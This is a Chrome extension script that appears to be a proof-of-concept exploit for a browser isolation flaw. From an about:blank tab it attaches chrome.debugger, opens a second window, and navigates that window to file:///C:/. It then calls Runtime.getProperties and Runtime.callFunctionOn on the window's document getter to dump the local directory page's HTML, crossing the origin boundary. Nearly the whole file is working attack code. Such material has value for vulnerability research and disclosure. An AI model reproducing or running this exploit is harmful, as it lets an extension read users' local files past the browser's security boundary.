const targetUrl = "file:///C:/";

let tabCreatedListener = null;

chrome.tabs.onCreated.addListener(function (tab) {
    if (tabCreatedListener) {
        tabCreatedListener(tab);
    }
});

let tabUpdatedListener = null;

chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
    if (tabUpdatedListener) {
        tabUpdatedListener(tabId, changeInfo, tab);
    }
});

startProcess();

function startProcess() {
    let aboutBlankTab = null;

    // This about:blank page will be created in a new browsing context group. The associated process
    // will not not be locked to a particular origin.
    chrome.tabs.create({url: "about:blank"}, function (tab) {
        aboutBlankTab = tab;
    });

    tabUpdatedListener = function (tabId, changeInfo, updatedTab) {
        if (aboutBlankTab
            && tabId === aboutBlankTab.id
            && changeInfo.status === "complete") {
            tabUpdatedListener = null;

            onAboutBlankTabLoaded(aboutBlankTab);
        }
    };
}

function onAboutBlankTabLoaded(tab) {
    chrome.debugger.attach({tabId: tab.id}, "1.3", function () {
        onDebuggerAttachedToAboutBlankTab(tab);
    });
}

function onDebuggerAttachedToAboutBlankTab(tab) {
    chrome.debugger.sendCommand({tabId: tab.id}, "Runtime.evaluate",
        {expression: "window.newWindow = window.open()", userGesture: true});

    tabCreatedListener = function (newTab) {
        if (newTab.hasOwnProperty("openerTabId") && newTab.openerTabId === tab.id) {
            tabCreatedListener = null;

            onSecondTabCreated(tab, newTab);
        }
    };
}

function onSecondTabCreated(tab, secondTab) {
    // secondTab was created by the original about:blank page and is therefore in the same browsing
    // context group. When the navigation below completes, the target (file:///C:/) page will be
    // hosted in the same process as the about:blank page and the process will be locked to
    // file:///.
    // The steps here also work with a URL like https://chrome.google.com/non-existent (as well as
    // other non-privileged URLs).
    chrome.tabs.update(secondTab.id, {url: targetUrl});

    tabUpdatedListener = function (tabId, changeInfo, updatedTab) {
        // The only reason the "tabs" permission is requested is so that the url property for
        // updatedTab can be retrieved below.
        if (tabId === secondTab.id
            && changeInfo.status === "complete"
            && updatedTab.url === targetUrl) {
            tabUpdatedListener = null;

            onFilePageLoaded(tab);
        }
    };
}

function onFilePageLoaded(tab) {
    chrome.debugger.sendCommand({tabId: tab.id}, "Runtime.evaluate",
        {expression: "window.newWindow"}, function (result) {
            onFilePageWindowObjectIdDetermined(tab, result.result.objectId);
        });
}

function onFilePageWindowObjectIdDetermined(tab, fileFrameObjectId) {
    chrome.debugger.sendCommand({tabId: tab.id}, "Runtime.getProperties",
        {objectId: fileFrameObjectId}, function (result) {
            onFilePageWindowPropertiesRetrieved(tab, result.result);
        });
}

function onFilePageWindowPropertiesRetrieved(tab, fileFrameProperties) {
    let documentProperty = fileFrameProperties.find(function (property) {
        if (property.name === "document" && property.hasOwnProperty("get")) {
            return true;
        }

        return false;
    });

    if (!documentProperty) {
        return;
    }

    onFilePageDocumentPropertyFound(tab, documentProperty);
}

function onFilePageDocumentPropertyFound(tab, fileFrameDocumentProperty) {
    chrome.debugger.sendCommand({tabId: tab.id}, "Runtime.callFunctionOn",
        {functionDeclaration: "function () {console.log(this().documentElement.outerHTML);}",
        objectId: fileFrameDocumentProperty.get.objectId});
}